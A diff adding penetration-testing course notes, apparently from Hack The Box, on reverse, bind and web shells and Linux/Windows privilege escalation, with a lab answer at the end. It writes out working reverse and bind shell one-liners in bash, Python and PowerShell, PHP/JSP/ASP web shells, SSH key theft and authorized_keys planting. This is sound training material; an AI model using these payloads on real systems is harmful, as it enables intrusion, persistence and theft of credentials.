@@ -403,4 +403,412 @@ A quick google search of the plug in finds this page:
 https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/
 
 
+# Types of Shells
+
+Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., Bash or PowerShell, so we can thoroughly investigate the remote system for our next move.
+
+One way to connect to a compromised system is through network protocols, like SSH for Linux or WinRM for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.
+
+The other method of accessing a compromised host for control and remote code execution is through shells.
+As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.
+
+Type of Shell 	Method of Communication
+Reverse Shell 	Connects back to our system and gives us control through a reverse connection.
+Bind Shell 	Waits for us to connect to it and gives us control once we do.
+Web Shell 	Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
+
+Let us dive more deeply into each of the above shells and walk through examples of each.
+
+A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.
+
+
+`nc -lvnp 1234`
+
+The flags we are using are the following:
+
+
+-l 	Listen mode, to wait for a connection to connect to us.
+-v 	Verbose mode, so that we know when we receive a connection.
+-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.
+-p 1234 	Port number netcat is listening on, and the reverse connection should be sent to.
+
+Now that we have a netcat listener waiting for a connection, we can execute the reverse shell command that connects to us.
+
+However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the following command:
+
+```
+ip a
+
+...SNIP...
+
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none
+    inet 10.10.10.10/23 scope global tun0
+...SNIP...
+```
+
+In our example, the IP we are interested in is under tun0, which is the same HTB network we connected to through our VPN.
+
+Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.
+
+
+The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.
+
+Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection. The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:
+
+``` bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+
+``` Powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
+We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our netcat listener:
+
+
+```
+nc -lvnp 1234
+
+listening on [any] 1234 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+As we can see, after we received a connection on our netcat listener, we were able to type our command and directly get its output back, right in our machine.
+
+A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.
+
+
+Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.
+
+Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system.
+
+
+Once again, we can utilize Payload All The Things to find a proper command to start our bind shell.
+
+Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.
+
+The following are reliable commands we can use to start a bind shell:
+
+``` bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+
+``` python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+``` powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+
+Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
+
+We can use netcat to connect to that port and get a connection to the shell:
+
+```
+nc 10.10.10.1 1234
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
+
+Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
+
+There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
+
+```
+www-data@remotehost$ ^Z
+
+stty raw -echo
+fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+```
+
+Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
+
+We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
+
+```
+echo $TERM
+
+xterm-256color
+
+stty size
+
+67 318
+
+```
+The first command showed us the TERM variable, and the second shows us the values for rows and columns, respectively. Now that we have our variables, we can go back to our netcat shell and use the following command to correct them:
+
+```
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
+```
+
+The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
+Writing a Web Shell
+
+First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
+
+``` php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+``` jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+``` asp
+<% eval request("cmd") %>
+```
+
+Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
+
+However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
+
+Web Server 	Default Webroot
+Apache 	/var/www/html/
+Nginx 	/usr/local/nginx/html/
+IIS 	c:\inetpub\wwwroot\
+XAMPP 	C:\xampp\htdocs\
+
+We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
+
+``` bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:
+
+```
+curl http://SERVER_IP:PORT/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
+
+On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.
+
+# Privilege Escalation
+
+
+Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows. Let us walk through some common methods of escalating our privileges.
+PrivEsc Checklists
+
+Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.
+
+https://book.hacktricks.xyz/
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.
+
+Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
+
+Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
+
+Let us take an example of running the Linux script from PEASS called LinPEAS:
+
+```
+/linpeas.sh
+...SNIP...
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEYEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMangenta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 3.9.0-73-generic
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...SNIP...
+```
+
+As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.
+Kernel Exploits
+
+Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.
+
+For example, the above script showed us the Linux version to be 3.9.0-73-generic. If we Google exploits for this version or use searchsploit, we would find a CVE-2016-5195, otherwise known as DirtyCow. We can search for and download the DirtyCow exploit and run it on the server to gain root access.
+
+The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.
+
+Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
+User Privileges
+
+Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:
+
+    Sudo
+    SUID
+    Windows Token Privileges
+
+The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like tcpdump' or allow the user to access certain root-only directories. We can check what sudo privileges we have with the sudo -l command:
+
+```
+sudo -l
+
+[sudo] password for user1:
+...SNIP...
+
+User user1 may run the following commands on ExampleServer:
+    (ALL : ALL) ALL
+```
+
+The above output says that we can run all commands with sudo, which gives us complete access, and we can use the su command with sudo to switch to the root user:
+
+```
+sudo su -
+
+[sudo] password for user1:
+whoami
+root
+```
+
+The above command requires a password to run any commands with sudo. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:
+
+```
+sudo -l
+
+    (user : user) NOPASSWD: /bin/echo
+```
+
+The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:
+
+```
+sudo -u user /bin/echo Hello World!
+
+    Hello World!
+```
+
+Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user. GTFOBins contains a list of commands and how they can be exploited through sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.
+
+LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.
+
+https://gtfobins.github.io/
+
+https://lolbas-project.github.io/#
+
+In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
+
+    Add new scheduled tasks/cron jobs
+    Trick them to execute a malicious software
+
+The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:
+
+    /etc/crontab
+    /etc/cron.d
+    /var/spool/cron/crontabs/root
+
+If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
+
+Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:
+
+```
+...SNIP...
+[+] Searching passwords in config PHP files
+[+] Finding passwords inside logs (limit 70)
+...SNIP...
+/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
+```
+
+As we can see, the database password 'password123' is exposed, which would allow us to log in to the local mysql databases and look for interesting information. We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:
+
+```
+su -
+
+Password: password123
+whoami
+
+root
+```
+
+We may also use the user credentials to ssh into the server as that user.
+SSH Keys
+
+Finally, let us discuss SSH keys. If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:
+
+```
+vim id_rsa
+chmod 600 id_rsa
+ssh root@10.10.10.10 -i id_rsa
+
+root@10.10.10.10#
+```
+Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
+
+If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:
+
+```
+ssh-keygen -f key
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******
+
+Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:...SNIP... user@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..o.++.+      |
+...SNIP...
+|     . ..oo+.    |
++----[SHA256]-----+
+```
+
+This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
+
+`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
+
+Now, the remote server should allow us to log in as that user by using our private key:
+
+`ssh root@10.10.10.10 -i key`
+
+As we can see, we can now ssh in as the user root. The Linux Privilege Escalation and the Windows Privilege Escalation modules go into more details on how to use each of these methods for Privilege Escalation, and many others as well.
+
+--------------------
+
+The questions in this section are:
+SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'. 
+
+```
+sudo -l
+Matching Defaults entries for user1 on ng-1101645-gettingstartedprivesc-dty5q-84c85699dc-jdd6s:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user1 may run the following commands on ng-1101645-gettingstartedprivesc-dty5q-84c85699dc-jdd6s:
+    (user2 : user2) NOPASSWD: /bin/bash
+
+
+Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 
+```
+
+sudo -u user2 /bin/bash
+
+Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 
+
+This was just copying the id_rsa file from the root directory
 
